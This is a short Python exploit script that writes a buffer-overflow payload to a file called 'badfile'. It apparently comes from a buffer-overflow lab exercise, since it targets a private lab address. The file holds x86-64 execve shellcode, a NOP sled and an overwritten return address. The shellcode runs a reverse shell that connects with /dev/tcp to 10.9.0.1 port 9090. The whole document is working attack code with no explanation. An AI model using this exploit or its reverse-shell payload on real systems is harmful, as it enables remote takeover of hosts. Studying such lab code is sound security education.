#!/usr/bin/python3
import sys

shellcode= (
  "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
  "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
  "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
  "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
  "/bin/bash*"
  "-c*"
  "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
).encode('latin-1')

print(len(shellcode))

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

content[517 - len(shellcode):] = shellcode

EBP    = 0x00007fffffffe010 + 1300    
offset = 96 + 8  # BP-SF + 8

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 8] = (EBP).to_bytes(8,byteorder='little') 

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
